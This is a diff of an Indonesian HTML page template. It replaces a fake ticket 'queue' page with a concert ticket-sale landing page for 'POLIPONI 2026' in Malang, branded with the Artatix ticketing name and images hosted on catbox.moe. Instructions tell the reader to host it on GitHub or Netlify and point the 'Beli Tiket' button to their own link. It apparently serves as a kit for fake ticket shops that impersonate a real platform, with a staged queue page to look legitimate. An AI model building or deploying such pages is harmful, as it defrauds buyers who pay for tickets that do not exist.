@@ -1,518 +1,393 @@
+# Full HTML Landing Page Event (Mobile Friendly)
+
+```html
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Anda Dalam Antrian</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>POLIPONI 2026</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Poppins',sans-serif;
+}
 
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+body{
+background:#f5f6fb;
+color:#111;
+padding-bottom:130px;
+}
 
-  <style>
-    *{
-      margin:0;
-      padding:0;
-      box-sizing:border-box;
-      font-family:'Poppins',sans-serif;
-    }
+.header{
+background:#1e40ff;
+padding:18px 16px;
+display:flex;
+align-items:center;
+justify-content:space-between;
+position:sticky;
+top:0;
+z-index:999;
+box-shadow:0 4px 15px rgba(0,0,0,0.12);
+}
 
-    body{
-      overflow:hidden;
-      height:100vh;
-      background:
-      linear-gradient(135deg,#ffffff 0%,#f4f4f4 40%,#ffffff 100%);
-      position:relative;
-    }
+.logo{
+font-size:32px;
+font-weight:700;
+color:white;
+}
 
-    /* BACKGROUND GRID */
-    body::before{
-      content:"";
-      position:absolute;
-      inset:0;
-      background-image:
-      linear-gradient(rgba(0,0,0,0.05) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(0,0,0,0.05) 1px, transparent 1px);
-      background-size:40px 40px;
-      z-index:0;
-      animation:gridMove 12s linear infinite;
-    }
+.header-icons{
+display:flex;
+gap:12px;
+}
 
-    @keyframes gridMove{
-      from{transform:translateY(0px);}
-      to{transform:translateY(40px);}
-    }
+.icon-btn{
+width:46px;
+height:46px;
+border-radius:50%;
+background:rgba(255,255,255,0.15);
+display:flex;
+align-items:center;
+justify-content:center;
+color:white;
+font-size:20px;
+backdrop-filter:blur(5px);
+}
 
-    .floating-shape{
-      position:absolute;
-      border-radius:20px;
-      filter:blur(1px);
-      opacity:.25;
-      animation:float 8s ease-in-out infinite;
-    }
+.banner img{
+width:100%;
+display:block;
+}
 
-    .shape1{
-      width:180px;
-      height:180px;
-      background:#ff4d00;
-      top:-60px;
-      left:-60px;
-    }
+.container{
+padding:22px;
+}
 
-    .shape2{
-      width:150px;
-      height:150px;
-      background:#00d5ff;
-      bottom:-50px;
-      right:-50px;
-      animation-delay:2s;
-    }
+.badge{
+display:inline-flex;
+align-items:center;
+gap:8px;
+padding:10px 16px;
+background:#e8ecff;
+color:#3d5afe;
+border-radius:14px;
+font-weight:600;
+margin-bottom:18px;
+}
 
-    .shape3{
-      width:120px;
-      height:120px;
-      background:#ffe100;
-      top:30%;
-      right:5%;
-      animation-delay:1s;
-    }
+.title{
+font-size:38px;
+font-weight:700;
+line-height:1.2;
+margin-bottom:24px;
+}
 
-    .shape4{
-      width:100px;
-      height:100px;
-      background:#00ff5e;
-      bottom:15%;
-      left:8%;
-      animation-delay:3s;
-    }
+.section-title{
+font-size:30px;
+font-weight:700;
+margin-bottom:20px;
+}
 
-    @keyframes float{
-      0%,100%{
-        transform:translateY(0px) rotate(0deg);
-      }
-      50%{
-        transform:translateY(-30px) rotate(10deg);
-      }
-    }
+.detail-box{
+display:flex;
+gap:16px;
+margin-bottom:20px;
+align-items:flex-start;
+}
 
-    .container{
-      position:relative;
-      z-index:2;
-      width:100%;
-      height:100vh;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      padding:20px;
-    }
+.detail-icon{
+width:46px;
+height:46px;
+border-radius:14px;
+background:#e8ecff;
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:22px;
+color:#4169ff;
+flex-shrink:0;
+}
 
-    .card{
-      width:100%;
-      max-width:480px;
-      background:rgba(255,255,255,0.78);
-      backdrop-filter:blur(18px);
-      border:4px solid #000;
-      border-radius:35px;
-      padding:35px 28px;
-      box-shadow:
-      0 25px 50px rgba(0,0,0,0.18),
-      0 0 0 8px rgba(255,255,255,0.35);
-      position:relative;
-      overflow:hidden;
-      animation:cardPop .9s ease;
-    }
+.detail-text{
+font-size:24px;
+font-weight:500;
+line-height:1.5;
+}
 
-    @keyframes cardPop{
-      from{
-        opacity:0;
-        transform:scale(.8) translateY(80px);
-      }
-      to{
-        opacity:1;
-        transform:scale(1) translateY(0);
-      }
-    }
+.organizer{
+margin-top:30px;
+}
 
-    .topbar{
-      display:flex;
-      justify-content:center;
-      gap:10px;
-      margin-bottom:18px;
-    }
+.organizer img{
+width:70px;
+margin-bottom:10px;
+}
 
-    .dot{
-      width:22px;
-      height:22px;
-      border-radius:6px;
-      animation:bounce 2s infinite;
-    }
+.organizer-name{
+font-size:28px;
+font-weight:600;
+}
 
-    .dot:nth-child(1){background:#ff5b00;}
-    .dot:nth-child(2){background:#ffd500; animation-delay:.2s;}
-    .dot:nth-child(3){background:#00d9ff; animation-delay:.4s;}
-    .dot:nth-child(4){background:#00ff4c; animation-delay:.6s;}
+.social-title{
+margin-top:34px;
+font-size:24px;
+font-weight:600;
+margin-bottom:14px;
+color:#6b7280;
+}
 
-    @keyframes bounce{
-      0%,100%{transform:translateY(0);}
-      50%{transform:translateY(-10px);}
-    }
+.socials{
+display:flex;
+gap:14px;
+margin-bottom:30px;
+}
 
-    .logo{
-      text-align:center;
-      font-size:48px;
-      font-weight:900;
-      line-height:1;
-      letter-spacing:2px;
-      color:#000;
-      margin-bottom:10px;
-      text-transform:uppercase;
-    }
+.social-btn{
+background:#eef2ff;
+padding:14px 18px;
+border-radius:18px;
+font-size:24px;
+font-weight:600;
+color:#3d5afe;
+display:flex;
+align-items:center;
+gap:10px;
+}
 
-    .logo span{
-      display:block;
-      font-size:15px;
-      letter-spacing:4px;
-      margin-top:12px;
-      font-weight:600;
-    }
+.tabs{
+display:flex;
+gap:30px;
+border-bottom:2px solid #e5e7eb;
+margin-bottom:28px;
+overflow:auto;
+}
 
-    .poster{
-      width:100%;
-      border-radius:24px;
-      border:5px solid #000;
-      overflow:hidden;
-      box-shadow:0 12px 30px rgba(0,0,0,.18);
-      margin:20px 0;
-      animation:posterFloat 5s ease-in-out infinite;
-    }
+.tab{
+padding-bottom:14px;
+font-size:24px;
+font-weight:500;
+color:#6b7280;
+white-space:nowrap;
+}
 
-    .poster img{
-      width:100%;
-      display:block;
-    }
+.tab.active{
+color:#111;
+border-bottom:4px solid #4169ff;
+}
 
-    @keyframes posterFloat{
-      0%,100%{
-        transform:translateY(0px);
-      }
-      50%{
-        transform:translateY(-10px);
-      }
-    }
+.content h2{
+font-size:34px;
+margin-bottom:18px;
+}
 
-    .queue-title{
-      text-align:center;
-      font-size:34px;
-      font-weight:900;
-      color:#000;
-      margin-top:8px;
-      line-height:1.2;
-    }
+.content p{
+font-size:25px;
+line-height:1.8;
+margin-bottom:24px;
+}
 
-    .queue-title span{
-      color:#ff4d00;
-    }
+.content li{
+font-size:24px;
+line-height:1.9;
+margin-bottom:16px;
+margin-left:24px;
+}
 
-    .subtitle{
-      text-align:center;
-      margin-top:10px;
-      color:#444;
-      font-size:15px;
-      font-weight:500;
-      line-height:1.6;
-    }
+.bottom-card{
+position:fixed;
+bottom:0;
+left:0;
+right:0;
+background:white;
+padding:18px;
+box-shadow:0 -6px 20px rgba(0,0,0,0.1);
+border-top-left-radius:28px;
+border-top-right-radius:28px;
+}
 
-    .loading-wrap{
-      margin-top:28px;
-    }
+.bottom-wrap{
+background:#f3f4f6;
+border-radius:24px;
+padding:20px;
+}
 
-    .loading-text{
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      margin-bottom:12px;
-      font-weight:700;
-      color:#111;
-      font-size:15px;
-    }
+.price-row{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:18px;
+}
 
-    .progress{
-      width:100%;
-      height:28px;
-      background:#ddd;
-      border-radius:999px;
-      overflow:hidden;
-      border:3px solid #000;
-      position:relative;
-    }
+.price-label{
+font-size:24px;
+color:#9ca3af;
+}
 
-    .progress-bar{
-      width:0%;
-      height:100%;
-      border-radius:999px;
-      background:
-      linear-gradient(90deg,#ff4d00,#ffe100,#00d5ff,#00ff5e);
-      background-size:300% 300%;
-      animation:
-      loading 18s linear forwards,
-      gradientMove 4s ease infinite;
-      position:relative;
-    }
+.price{
+font-size:34px;
+font-weight:700;
+}
 
-    .progress-bar::after{
-      content:"";
-      position:absolute;
-      top:0;
-      right:0;
-      width:60px;
-      height:100%;
-      background:rgba(255,255,255,.45);
-      filter:blur(8px);
-    }
+.buy-btn{
+width:100%;
+height:74px;
+border:none;
+border-radius:20px;
+background:#3d5afe;
+color:white;
+font-size:28px;
+font-weight:700;
+cursor:pointer;
+transition:0.3s;
+}
 
-    @keyframes gradientMove{
-      0%{background-position:0% 50%;}
-      50%{background-position:100% 50%;}
-      100%{background-position:0% 50%;}
-    }
+.buy-btn:active{
+transform:scale(0.98);
+}
 
-    @keyframes loading{
-      from{width:0%;}
-      to{width:100%;}
-    }
+@media(max-width:480px){
+.title{
+font-size:30px;
+}
 
-    .queue-box{
-      margin-top:24px;
-      display:flex;
-      justify-content:space-between;
-      gap:15px;
-    }
+.section-title{
+font-size:26px;
+}
 
-    .mini-box{
-      flex:1;
-      border:3px solid #000;
-      border-radius:18px;
-      padding:18px 12px;
-      text-align:center;
-      background:#fff;
-      box-shadow:8px 8px 0 #000;
-      animation:boxJump 3s ease-in-out infinite;
-    }
+.detail-text,
+.content p,
+.content li{
+font-size:18px;
+}
 
-    .mini-box:nth-child(2){
-      animation-delay:1s;
-    }
+.content h2{
+font-size:28px;
+}
 
-    .mini-box:nth-child(3){
-      animation-delay:2s;
-    }
+.social-btn,
+.tab,
+.organizer-name{
+font-size:18px;
+}
 
-    @keyframes boxJump{
-      0%,100%{
-        transform:translateY(0);
-      }
-      50%{
-        transform:translateY(-8px);
-      }
-    }
+.price{
+font-size:28px;
+}
 
-    .mini-box h3{
-      font-size:13px;
-      color:#555;
-      margin-bottom:6px;
-      font-weight:700;
-    }
-
-    .mini-box p{
-      font-size:24px;
-      font-weight:900;
-      color:#000;
-    }
-
-    .notice{
-      margin-top:25px;
-      background:#000;
-      color:#fff;
-      border-radius:18px;
-      padding:16px;
-      text-align:center;
-      font-size:14px;
-      font-weight:600;
-      line-height:1.6;
-      animation:pulse 2s infinite;
-    }
-
-    @keyframes pulse{
-      0%{
-        transform:scale(1);
-      }
-      50%{
-        transform:scale(1.02);
-      }
-      100%{
-        transform:scale(1);
-      }
-    }
-
-    .blink{
-      color:#ffe100;
-      animation:blink 1s infinite;
-    }
-
-    @keyframes blink{
-      0%,100%{opacity:1;}
-      50%{opacity:.3;}
-    }
-
-    .footer{
-      text-align:center;
-      margin-top:18px;
-      font-size:12px;
-      color:#666;
-      font-weight:600;
-    }
-
-    .wave{
-      position:absolute;
-      bottom:-20px;
-      left:0;
-      width:100%;
-      height:120px;
-      background:
-      radial-gradient(circle at 20% 20%, #00d5ff 0 20%, transparent 21%),
-      radial-gradient(circle at 80% 20%, #00ff5e 0 20%, transparent 21%),
-      radial-gradient(circle at 50% 80%, #ffe100 0 20%, transparent 21%);
-      opacity:.15;
-      z-index:0;
-      animation:waveMove 12s linear infinite;
-    }
-
-    @keyframes waveMove{
-      from{transform:translateX(0);}
-      to{transform:translateX(-100px);}
-    }
-
-    @media(max-width:500px){
-
-      .logo{
-        font-size:38px;
-      }
-
-      .queue-title{
-        font-size:28px;
-      }
-
-      .card{
-        padding:28px 20px;
-      }
-
-      .mini-box p{
-        font-size:20px;
-      }
-    }
-  </style>
+.buy-btn{
+font-size:22px;
+height:62px;
+}
+}
+</style>
 </head>
 <body>
 
-  <div class="floating-shape shape1"></div>
-  <div class="floating-shape shape2"></div>
-  <div class="floating-shape shape3"></div>
-  <div class="floating-shape shape4"></div>
+<div class="header">
+<div class="logo">Artatix</div>
+<div class="header-icons">
+<div class="icon-btn">🌐</div>
+<div class="icon-btn">🔍</div>
+<div class="icon-btn">☰</div>
+</div>
+</div>
 
-  <div class="wave"></div>
+<div class="banner">
+<img src="https://files.catbox.moe/1n4f6w.jpg" alt="banner">
+</div>
 
-  <div class="container">
+<div class="container">
 
-    <div class="card">
+<div class="badge">🎵 Musik</div>
 
-      <div class="topbar">
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-      </div>
+<div class="title">Poliponi 2026 - Malang</div>
 
-      <div class="logo">
-        POLIPONI
-        <span>SI PALING KONSER 2026</span>
-      </div>
+<div class="section-title">Detail Acara</div>
 
-      <div class="poster">
-        <!-- GANTI FOTO DI BAWAH DENGAN FOTO ANDA -->
-        <img src="1119.png" alt="Poster Event">
-      </div>
+<div class="detail-box">
+<div class="detail-icon">📅</div>
+<div class="detail-text">20 Juni 2026</div>
+</div>
 
-      <div class="queue-title">
-        Anda Dalam <span>Antrian</span>
-      </div>
+<div class="detail-box">
+<div class="detail-icon">🕒</div>
+<div class="detail-text">14:00 - 23:00</div>
+</div>
 
-      <div class="subtitle">
-        Mohon jangan menutup halaman ini.<br>
-        Sistem sedang memverifikasi akses tiket Anda.
-      </div>
+<div class="detail-box">
+<div class="detail-icon">📍</div>
+<div class="detail-text">Lapangan Rampal, Malang, Jawa Timur</div>
+</div>
 
-      <div class="loading-wrap">
+<div class="organizer">
+<div class="section-title">Penyelenggara</div>
+<img src="https://files.catbox.moe/aq5g5w.png">
+<div class="organizer-name">PT. AMAZING LETRALIVE</div>
+</div>
 
-        <div class="loading-text">
-          <span>Memproses Antrian...</span>
-          <span id="percent">0%</span>
-        </div>
+<div class="social-title">Media Sosial</div>
 
-        <div class="progress">
-          <div class="progress-bar"></div>
-        </div>
+<div class="socials">
+<div class="social-btn">📸 Instagram</div>
+<div class="social-btn">🎵 TikTok</div>
+</div>
 
-      </div>
+<div class="tabs">
+<div class="tab active">Deskripsi</div>
+<div class="tab">Syarat & Ketentuan</div>
+<div class="tab">Fasilitas</div>
+</div>
 
-      <div class="queue-box">
+<div class="content">
+<h2>Deskripsi</h2>
+<p>
+POLIPONI adalah konser musik spektakuler yang menghadirkan pengalaman terbaik untuk menikmati pertunjukan artis populer Indonesia.
+Dengan konsep modern dan tata panggung megah, acara ini siap memberikan pengalaman konser yang berkesan.
+</p>
 
-        <div class="mini-box">
-          <h3>Nomor</h3>
-          <p>#A271</p>
-        </div>
+<h2>Syarat & Ketentuan</h2>
 
-        <div class="mini-box">
-          <h3>Status</h3>
-          <p>WAIT</p>
-        </div>
+<ol>
+<li>Tiket resmi hanya dijual melalui website resmi penyelenggara.</li>
+<li>Satu tiket berlaku untuk satu orang.</li>
+<li>Maksimal pembelian 4 tiket dalam 1 transaksi.</li>
+<li>Pengunjung wajib menjaga ketertiban selama acara berlangsung.</li>
+<li>Dilarang membawa barang berbahaya ke area venue.</li>
+</ol>
+</div>
 
-        <div class="mini-box">
-          <h3>Server</h3>
-          <p>FAST</p>
-        </div>
+</div>
 
-      </div>
+<div class="bottom-card">
+<div class="bottom-wrap">
+<div class="price-row">
+<div class="price-label">Harga mulai dari</div>
+<div class="price">Rp320.000</div>
+</div>
 
-      <div class="notice">
-        <span class="blink">●</span>
-        Jangan refresh atau keluar dari halaman ini
-        agar proses tiket tidak gagal.
-      </div>
-
-      <div class="footer">
-        © 2026 POLIPONI • Powered By LETRAZIVE
-      </div>
-
-    </div>
-
-  </div>
-
-  <script>
-    let percent = document.getElementById("percent");
-    let value = 0;
-
-    let interval = setInterval(() => {
-      value++;
-      percent.innerHTML = value + "%";
-
-      if(value >= 100){
-        clearInterval(interval);
-
-        setTimeout(() => {
-          window.location.href = "halaman1.html";
-        }, 1500);
-      }
-
-    }, 180);
-  </script>
+<button class="buy-btn" onclick="window.location.href='https://linkanda.com'">
+🎟️ Beli Tiket
+</button>
+</div>
+</div>
 
 </body>
 </html>
+```
+
+## Cara Pakai
+
+1. Copy semua kode HTML di atas.
+2. Simpan dengan nama `index.html`
+3. Upload ke GitHub / Netlify / hosting.
+4. Ganti link tombol beli tiket:
+
+```html
+https://linkanda.com
+```
+
+menjadi link tujuan milik kamu.
